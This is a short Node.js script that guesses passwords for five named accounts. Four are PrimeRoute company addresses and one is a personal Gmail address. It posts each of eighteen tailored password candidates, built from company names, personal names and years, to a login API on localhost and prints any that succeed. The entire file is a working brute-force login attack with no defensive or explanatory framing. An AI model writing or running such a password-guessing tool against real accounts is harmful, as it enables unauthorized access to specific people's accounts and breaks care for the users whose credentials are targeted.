const http = require('http');

const candidates = [
  'Admin@PrimeRoute2026!',
  'Manager@2026!',
  'Priya@2026!',
  'PrimeRoute@2026!',
  'Warehouse@2026!',
  'Sanj@102026',
  'Sanjana@102026',
  'AdminPassword123!',
  'password123',
  'password',
  'Manager@123',
  'Priya@123',
  'Admin@123',
  'Customer@123',
  'Driver@123',
  'Driver@2026!',
  'Test@1234',
  'Test@2026!'
];

const users = ['priya@primeroute.com', 'admin@primeroute.com', 'sanjanaaa.shru@gmail.com', 'ccu.east@primeroute.com', 'ramesh@primeroute.com'];

function check(email, pwd) {
  return new Promise((resolve) => {
    const data = JSON.stringify({ email, password: pwd });
    const req = http.request(
      {
        hostname: 'localhost',
        port: 8080,
        path: '/api/auth/login',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data),
        },
      },
      (res) => {
        let body = '';
        res.on('data', (c) => (body += c));
        res.on('end', () => {
          if (res.statusCode === 200) {
            console.log(`>>> SUCCESS! [${email}] password is: "${pwd}"`);
            resolve(true);
          } else {
            resolve(false);
          }
        });
      }
    );
    req.on('error', () => resolve(false));
    req.write(data);
    req.end();
  });
}

async function run() {
  for (const u of users) {
    console.log(`Testing user ${u}...`);
    for (const p of candidates) {
      const ok = await check(u, p);
      if (ok) break;
    }
  }
}

run();
